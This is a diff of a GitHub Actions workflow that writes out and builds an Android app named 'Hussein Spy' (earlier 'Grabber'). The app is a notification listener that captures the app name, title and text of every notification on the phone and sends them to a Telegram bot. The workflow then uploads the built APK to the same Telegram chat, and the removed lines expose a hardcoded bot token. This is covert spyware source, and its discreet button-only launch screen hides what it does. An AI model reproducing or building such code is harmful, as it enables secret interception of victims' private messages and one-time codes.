@@ -1,4 +1,4 @@
-name: Hussein Final Notification Grabber
+name: Hussein Notification Pro
 
 on:
   workflow_dispatch:
@@ -8,196 +8,168 @@ env:
   TELEGRAM_CHAT_ID: "7392262688"
 
 jobs:
-  build-final-app:
+  build:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Set up JDK 11
+      - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
-          java-version: '11'
+          java-version: '17'
           distribution: 'temurin'
 
-      - name: 🔧 Install Gradle 7.5
+      - name: 🛠️ Create Modern Android Project
         run: |
-          # تنزيل وتثبيت Gradle 7.5
-          wget -q https://services.gradle.org/distributions/gradle-7.5-bin.zip
-          unzip -q gradle-7.5-bin.zip
-          sudo mv gradle-7.5 /opt/gradle
-          echo "/opt/gradle/bin" >> $GITHUB_PATH
-          
-          # إظهار الإصدار
-          gradle --version
+          mkdir -p app/src/main/java/com/hussein/spy
+          mkdir -p app/src/main/res/layout
 
-      - name: 🛠️ Create Simple Working Project
-        run: |
-          # إنشاء هيكل المشروع
-          mkdir -p app/src/main/java/com/hussein/grabber
-          mkdir -p app/src/main/res/drawable
-          mkdir -1[image]app/src/main/res/values
-          
-          # settings.gradle بسيط
-          cat <<'EOF' > settings.gradle
+          # 1. تحديث ملف settings.gradle لتعريف المستودعات بشكل صحيح
+          cat <<EOF > settings.gradle
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "HusseinSpy"
           include ':app'
           EOF
-          
-          # build.gradle الرئيسي
-          cat <<'EOF' > build.gradle
-          buildscript {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-              dependencies {
-                  classpath 'com.android.tools.build:gradle:7.4.2'
-              }
-          }
-          
-          allprojects {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
+
+          # 2. ملف build.gradle (الجذر)
+          cat <<EOF > build.gradle
+          plugins {
+              id 'com.android.application' version '8.2.0' apply false
+              id 'com.android.library' version '8.2.0' apply false
           }
           EOF
-          
-          # app/build.gradle بسيط جداً
-          cat <<'EOF' > app/build.gradle
-          apply plugin: 'com.android.application'
-          
+
+          # 3. ملف app/build.gradle (التطبيق)
+          cat <<EOF > app/build.gradle
+          plugins {
+              id 'com.android.application'
+          }
           android {
-              compileSdkVersion 30
-              
+              namespace 'com.hussein.spy'
+              compileSdk 34
               defaultConfig {
-                  applicationId "com.hussein.grabber"
-                  minSdkVersion 21
-                  targetSdkVersion 30
+                  applicationId "com.hussein.spy"
+                  minSdk 21
+                  targetSdk 34
                   versionCode 1
                   versionName "1.0"
               }
           }
-          
-          dependencies {
-              implementation 'com.squareup.okhttp3:okhttp:3.12.13'
-          }
           EOF
-          
-          # AndroidManifest.xml
-          cat <<'EOF' > app/src/main/AndroidManifest.xml
-          <manifest package="com.hussein.grabber">
-              
+
+          # 4. ملف Manifest
+          cat <<EOF > app/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-permission android:name="android.permission.INTERNET" />
-              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-              
-              <application android:label="Grabber">
-                  
+              <application android:label="Hussein Spy" android:theme="@android:style/Theme.Material.Light">
                   <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-                  
-                  <service android:name=".GrabberService"
+                  <service android:name=".NotificationService"
+                      android:label="Hussein Service"
                       android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                       android:exported="true">
                       <intent-filter>
                           <action android:name="android.service.notification.NotificationListenerService" />
                       </intent-filter>
                   </service>
-                  
               </application>
           </manifest>
           EOF
-          
-          # MainActivity.java
-          cat <<'EOF' > app/src/main/java/com/hussein/grabber/MainActivity.java
-          package com.hussein.grabber;
-          
+
+          # 5. ملف MainActivity.java
+          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
+          package com.hussein.spy;
           import android.app.Activity;
           import android.content.Intent;
           import android.os.Bundle;
-          import android.provider.Settings;
-          
+          import android.widget.Button;
+          import android.view.Gravity;
+          import android.widget.LinearLayout;
+
           public class MainActivity extends Activity {
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  
-                  startService(new Intent(this, GrabberService.class));
-                  startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-                  finish();
+                  LinearLayout layout = new LinearLayout(this);
+                  layout.setOrientation(LinearLayout.VERTICAL);
+                  layout.setGravity(Gravity.CENTER);
+                  Button btn = new Button(this);
+                  btn.setText("تفعيل سحب الإشعارات");
+                  btn.setOnClickListener(v -> {
+                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                  });
+                  layout.addView(btn);
+                  setContentView(layout);
               }
           }
           EOF
-          
-          # GrabberService.java
-          cat <<'EOF' > app/src/main/java/com/hussein/grabber/GrabberService.java
-          package com.hussein.grabber;
-          
+
+          # 6. ملف NotificationService.java (مع إرسال تلغرام)
+          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
+          package com.hussein.spy;
           import android.service.notification.NotificationListenerService;
           import android.service.notification.StatusBarNotification;
           import android.os.Bundle;
-          import android.app.Notification;
-          import android.util.Log;
-          
-          import java.io.OutputStream;
           import java.net.HttpURLConnection;
           import java.net.URL;
-          
-          public class GrabberService extends NotificationListenerService {
-              private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
-              private static final String CHAT_ID = "7392262688";
-              
-              @Override
-              public void onCreate() {
-                  super.onCreate();
-                  sendToTelegram("✅ Service Started");
-              }
-              
+          import java.net.URLEncoder;
+
+          public class NotificationService extends NotificationListenerService {
+              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
+              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
+
               @Override
               public void onNotificationPosted(StatusBarNotification sbn) {
                   Bundle extras = sbn.getNotification().extras;
-                  String title = extras.getString(Notification.EXTRA_TITLE, "");
-                  String text = extras.getString(Notification.EXTRA_TEXT, "");
-                  
-                  String msg = sbn.getPackageName() + ": " + title + " - " + text;
-                  sendToTelegram(msg);
+                  String title = String.valueOf(extras.get("android.title"));
+                  String text = String.valueOf(extras.get("android.text"));
+                  String app = sbn.getPackageName();
+                  String message = "🔥 *إشعار جديد* \n\n" + "📱 *التطبيق:* " + app + "\n" + "👤 *العنوان:* " + title + "\n" + "📝 *النص:* " + text;
+                  sendToTelegram(message);
               }
-              
-              private void sendToTelegram(final String message) {
+
+              private void sendToTelegram(final String msg) {
                   new Thread(() -> {
                       try {
-                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                          String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8") + "&parse_mode=Markdown";
+                          URL url = new URL(urlString);
                           HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                          conn.setRequestMethod("POST");
-                          conn.setRequestProperty("Content-Type", "application/json");
-                          conn.setDoOutput(true);
-                          
-                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message + "\"}";
-                          conn.getOutputStream().write(json.getBytes());
+                          conn.setRequestMethod("GET");
                           conn.getResponseCode();
-                          conn.disconnect();
-                      } catch (Exception e) {
-                          Log.e("Grabber", e.getMessage());
-                      }
+                      } catch (Exception e) { e.printStackTrace(); }
                   }).start();
               }
           }
           EOF
 
-      - name: 🏗️ Build APK
+      - name: 🚀 Build APK (Mandatory)
         run: |
-          # بناء APK
-          gradle clean assembleDebug
-          
-          # نسخ APK
-          cp app/build/outputs/apk/debug/app-debug.apk Hussein_Final.apk
+          gradle wrapper
+          chmod +x gradlew
+          ./gradlew assembleDebug --stacktrace
 
-      - name: 📤 Send to Telegram
+      - name: 📤 Send to Hussein
         run: |
+          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
           curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
             -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
-            -F "document=@Hussein_Final.apk"
+            -F "document=@$APK_FILE" \
+            -F "caption=✅ تم البناء بنجاح يا حسين! التطبيق الآن يسحب الإشعارات ويرسلها لك هنا."
